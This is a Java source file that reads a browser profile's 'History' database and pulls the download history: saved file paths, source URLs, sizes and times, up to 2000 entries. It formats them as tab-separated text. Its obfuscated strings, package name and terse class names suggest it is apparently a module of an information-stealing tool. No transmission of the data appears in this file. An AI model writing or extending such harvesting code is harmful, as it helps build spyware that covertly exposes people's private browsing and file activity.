package noface.browsers;

import noface.config.S;

import java.nio.file.Files;
import java.nio.file.Path;
import java.sql.ResultSet;
import java.util.ArrayList;
import java.util.List;

public final class Dl {

    public record Entry(String path, String url, long bytes, long when) {}

    private static String sql() {
        return S.e("SELECT target_path, tab_url, total_bytes, start_time FROM downloads ")
                + S.e("WHERE target_path IS NOT NULL AND length(target_path) > 0 ")
                + S.e("ORDER BY start_time DESC LIMIT 2000");
    }

    public static List<Entry> pull(Profile profile) {
        List<Entry> out = new ArrayList<>();
        Path db = profile.dir().resolve(S.e("History"));
        if (!Files.isRegularFile(db)) return out;
        Db.query(db, sql(), rs -> add(rs, out));
        return out;
    }

    private static void add(ResultSet rs, List<Entry> out) {
        try {
            String path = rs.getString(1);
            String url = rs.getString(2);
            long bytes = rs.getLong(3);
            long t = rs.getLong(4);
            if (path == null || path.isBlank()) return;
            out.add(new Entry(path, url == null ? "" : url, bytes, t));
        } catch (Exception ignored) {
        }
    }

    public static String fmt(List<Entry> entries) {
        StringBuilder sb = new StringBuilder();
        for (Entry e : entries) {
            sb.append(e.path()).append('\t').append(e.url()).append('\t')
                    .append(e.bytes()).append('\n');
        }
        return sb.toString();
    }

    private Dl() {}
}
